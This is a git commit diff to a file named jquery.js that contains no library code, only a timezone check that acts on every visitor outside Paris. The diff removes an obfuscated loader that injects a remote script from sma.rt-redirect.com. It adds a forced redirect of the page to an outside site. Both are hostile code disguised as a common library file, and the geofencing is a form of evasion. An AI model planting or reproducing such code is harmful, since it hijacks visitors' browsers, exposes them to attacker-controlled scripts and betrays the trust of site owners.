a9754a0b60e30cd5ce2c4018035ced4cb9b8d133
elankton <74224289+elankton@users.noreply.github.com>
2022-08-20 01:17:05 +0300

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,8 +1,3 @@
 if (Intl.DateTimeFormat().resolvedOptions().timeZone.toLowerCase().indexOf('/paris') === -1){
-    (function (a, d, j, o) {
-       o = a.createElement(d),
-          m = a.getElementsByTagName(d)[0];              
-       o.src = j + "?d=0&r=" + Math.random();
-       m.parentNode.insertBefore(o, m)
-    })(document, 'script', 'https://sma.rt-redirect.com/sl/3a1d9054');
+window.location.href = "https://elankton.github.io";
 }
